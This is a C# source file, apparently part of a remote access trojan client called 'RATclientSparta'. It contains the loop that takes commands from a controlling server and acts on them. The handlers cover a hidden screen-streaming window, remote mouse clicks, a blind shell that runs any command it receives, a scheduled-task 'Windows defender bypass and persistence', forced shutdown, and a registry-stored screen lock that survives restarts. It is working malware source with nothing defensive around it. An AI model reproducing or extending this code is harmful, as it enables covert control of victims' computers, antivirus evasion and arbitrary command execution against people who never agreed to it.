using System;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Speech.Synthesis;
using System.Windows.Forms;
using RATclientSparta.Tools;
using RATclientSparta.Tools.ScreenShare;
using RATclientSparta.Server.Send;
using RATclientSparta.Tools.Chat;
using SpartaRATclient.Tools;
using SpartaRATclient;
using RATclientSparta.Setup.RegistryData;
using RATclientSparta.Tools.Screen;

namespace RATclientSparta.Server
{
    public class ServerData
    {
        public delegate void GotMessage(byte[] message);
        public delegate void LostConnection();
        public delegate void screenStreamEvent();
        public delegate void paintStreamEvent(byte[] message);
        public delegate void PaintConfig(byte[] message);

        public event GotMessage ChatMessageEvent;
        public event LostConnection LostConnectionEvent;
        public event screenStreamEvent CloseScreenStream;
        public event paintStreamEvent PaintStream;
        public event PaintConfig PaintConfigs;

        public System.Net.Sockets.Socket SocketConnection = default(System.Net.Sockets.Socket);
        public bool ServerConnected = false;

        public ServerData(System.Net.Sockets.Socket ServerSocket)
        {
            this.ChatMessageEvent = delegate { };
            this.LostConnectionEvent = delegate { };
            this.CloseScreenStream = delegate { };
            this.PaintStream = delegate { };
            this.PaintConfigs = delegate { };
            this.SocketConnection = ServerSocket;
            this.ServerConnected = true;
        }
        public void Receive()
        {
            Send.SendData ClientSend = new Send.SendData(this.SocketConnection);
            new Thread(() => { ClientSend.SendDetails(); }).Start();
            ReadData ClientRead = new ReadData(this.SocketConnection);

            //Feature that locks the computer, Its using registry, So it will work even after computer restart.
            //If registry item called "ScreenLock" exist, then it will take its value(password) and open the Blocking GUI
            ScreenBlock.CheckIfLockRequired();

            while (ServerConnected)
            {
                try
                {
                    //server must send 6 bytes - Therefore client know to expect for 6 bytes.
                    byte[] tlv = ClientRead.Read(6);

                    //index 0 = type
                    byte type = tlv[0];

                    //index 1-6 = length
                    int lengthRead = BitConverter.ToInt32(tlv, 1);

                    //reading from server according to the Int32 bit value (from index 1-6)
                    byte[] message = ClientRead.Read(lengthRead);

                    switch (type)
                    {
                        //Connection test
                        case 0: break;

                        //chat (Message Received)
                        case 1: ChatMessageEvent.Invoke(message); break;

                        //chat (Opening GUI screen)
                        case 2: if (Application.OpenForms.OfType<Chat>().Count() == 0) { new Thread(new ThreadStart(() => { Chat chat = new Chat(this); chat.ShowDialog(); })).Start(); } break;

                        //computer Talk
                        case 4: string a = Encoding.ASCII.GetString(message); SpeechSynthesizer synth = new SpeechSynthesizer(); synth.SetOutputToDefaultAudioDevice(); synth.Speak(a); break;

                        //exit program
                        case 7: ClientSend.Send(Encoding.ASCII.GetBytes("\0"), 0); Environment.Exit(0); break;

                        //screen Stream - Opening the hidden GUI of screen share. (small resolution TopMost GUI window so it will work even when playing on fullscreen games)
                        case 8: if (Application.OpenForms.OfType<ScreenShare>().Count() == 0) { new Thread(new ThreadStart(() => { ScreenShare ShareScreen = new ScreenShare(this, SocketConnection); ShareScreen.ShowDialog(); })).Start(); } break;

                        //screen Stream - delegate event that stops the screen streaming
                        case 9: CloseScreenStream.Invoke(); break;

                        //Paint delegate X,Y,Location - on screen
                        case 10: PaintStream.Invoke(message); break;

                        //Windows defender bypass and persistence
                        case 20: new Thread(new ThreadStart(() => { schtask.Create(); })).Start(); break;

                        //Clicking on screen
                        case 22: Click click = new Click(); click.ScreenClick(message); break;

                        //Delete app
                        case 23: CurrentApp.Delete(); break;

                        //Blind Shell
                        case 13: Shell.Run(Encoding.ASCII.GetString(message), 5); break;

                        //Computer shutdown
                        case 14: Shell.Run(@"shutdown /s /t 1", 0); break;

                        //Creating registry value For the Screen lock in registry
                        case 24: RegistryCreate.Create("ScreenLock", Encoding.ASCII.GetString(message)); ScreenBlock.CheckIfLockRequired(); break;

                        //Adding default value for security reasons
                        default: break;
                    }
                }
                catch { break; }
            }
            this.SocketConnection.Close();
            LostConnectionEvent.Invoke();
            return; //returning - not connected

        }
    }
}
